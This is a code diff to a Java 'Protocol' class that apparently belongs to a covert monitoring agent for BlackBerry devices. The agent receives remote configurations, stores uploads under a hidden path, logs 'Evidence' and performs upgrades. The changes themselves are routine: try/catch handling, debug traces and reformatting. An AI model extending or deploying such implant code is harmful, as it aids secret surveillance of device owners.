@@ -21,6 +21,7 @@ import blackberry.action.sync.protocol.CommandException;
 import blackberry.action.sync.protocol.ProtocolException;
 import blackberry.action.sync.transport.Transport;
 import blackberry.config.Conf;
+import blackberry.debug.Check;
 import blackberry.debug.Debug;
 import blackberry.debug.DebugLevel;
 import blackberry.evidence.Evidence;
@@ -28,7 +29,6 @@ import blackberry.evidence.EvidenceType;
 import blackberry.fs.AutoFile;
 import blackberry.fs.Directory;
 import blackberry.fs.Path;
-import blackberry.debug.Check;
 import blackberry.utils.DateTime;
 import blackberry.utils.Utils;
 import blackberry.utils.WChar;
@@ -56,26 +56,55 @@ public abstract class Protocol {
 
     public synchronized static boolean saveNewConf(byte[] conf, int offset)
             throws CommandException {
-        final AutoFile file = new AutoFile(Path.conf(), Conf.NEW_CONF);
 
-        file.create();
-        final boolean ret = file.write(conf, offset, conf.length - offset);
-        if (!ret) {
+        boolean ret = false;
+        try {
             //#ifdef DEBUG
-            debug.error("saveNewConf: cannot write on file: "
-                    + file.getFullFilename());
+            debug.trace("saveNewConf opening");
             //#endif
+            final AutoFile file = new AutoFile(Path.conf(), Conf.NEW_CONF);
 
-            throw new CommandException(); //"write"
-        } else {
-            Evidence.info("New configuration received");
+            //#ifdef DEBUG
+            debug.trace("saveNewConf exists");
+            //#endif
+            if (file.exists()) {
+                //#ifdef DEBUG
+                debug.trace("saveNewConf delete");
+                //#endif
+                file.delete();
+            }
+
+            //#ifdef DEBUG
+            debug.trace("saveNewConf create");
+            //#endif
+            file.create();
+
+            //#ifdef DEBUG
+            debug.trace("saveNewConf write");
+            //#endif
+            ret = file.write(conf, offset, conf.length - offset);
+            if (!ret) {
+                //#ifdef DEBUG
+                debug.error("saveNewConf: cannot write on file: "
+                        + file.getFullFilename());
+                //#endif
+
+                throw new CommandException(); //"write"
+            } else {
+                Evidence.info("New configuration received");
+            }
+        } catch (Exception ex) {
+            //#ifdef DEBUG
+            debug.error(ex);
+            debug.error("saveNewConf");
+            //#endif
         }
 
         return ret;
     }
 
     public static void saveUpload(String filename, byte[] content) {
-        final AutoFile file = new AutoFile(Path.hidden(),filename);
+        final AutoFile file = new AutoFile(Path.hidden(), filename);
 
         if (file.exists()) {
             //#ifdef DEBUG
@@ -147,8 +176,10 @@ public abstract class Protocol {
     }
 
     public static boolean upgradeMulti() {
-        final AutoFile file_0 = new AutoFile(Path.hidden(), Protocol.UPGRADE_FILENAME_0);
-        final AutoFile file_1 = new AutoFile(Path.hidden(), Protocol.UPGRADE_FILENAME_1);
+        final AutoFile file_0 = new AutoFile(Path.hidden(),
+                Protocol.UPGRADE_FILENAME_0);
+        final AutoFile file_1 = new AutoFile(Path.hidden(),
+                Protocol.UPGRADE_FILENAME_1);
 
         if (file_0.exists() && file_1.exists()) {
             //#ifdef DEBUG
